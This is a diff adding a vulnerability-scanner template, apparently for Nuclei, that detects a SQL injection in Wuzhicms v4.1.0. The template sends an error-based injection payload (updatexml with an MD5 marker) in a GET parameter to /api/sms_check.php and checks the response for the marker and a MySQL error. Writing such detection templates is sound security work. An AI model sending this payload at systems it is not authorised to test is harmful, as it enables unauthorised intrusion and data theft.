@@ -1,0 +1,23 @@
+id: wuzhicms-sqli
+info:
+  author: princechaddha
+  name: Wuzhicms v4.1.0 SQL Injection
+  reference:
+  - https://github.com/wuzhicms/wuzhicms/issues/184
+  severity: high
+  tags: wuzhicms,sqli
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 81dc9bdb52d04dc20036dbd8313ed05
+    - sql_error:MySQL Query Error
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20'
